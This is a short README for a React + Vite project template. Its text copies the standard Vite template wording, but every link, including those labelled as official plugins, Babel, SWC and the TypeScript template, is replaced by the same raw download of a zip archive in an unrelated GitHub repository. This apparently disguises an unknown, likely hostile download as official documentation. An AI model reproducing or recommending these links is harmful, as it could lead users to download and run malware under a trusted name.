# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) uses [Babel](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) uses [SWC](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript and enable type-aware lint rules. Check out the [TS template](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/Gpcode233/brt-apps/main/src/assets/brt-apps_v1.0.zip) in your project.
